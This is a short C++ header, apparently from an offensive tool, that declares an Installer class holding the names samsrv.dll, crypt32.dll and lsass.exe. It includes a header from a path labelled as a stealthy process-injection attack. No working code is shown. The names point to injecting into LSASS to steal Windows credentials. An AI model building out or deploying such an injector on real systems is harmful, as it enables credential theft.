#include "../../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorInstaller.h"
#include <string>

using namespace std;

class Installer {
public:
    void Init();
    BOOL Install();
    wstring samsrvDll;
    wstring msvcrtDll;
    wstring crypt32Dll;
    wstring lsassExe;
};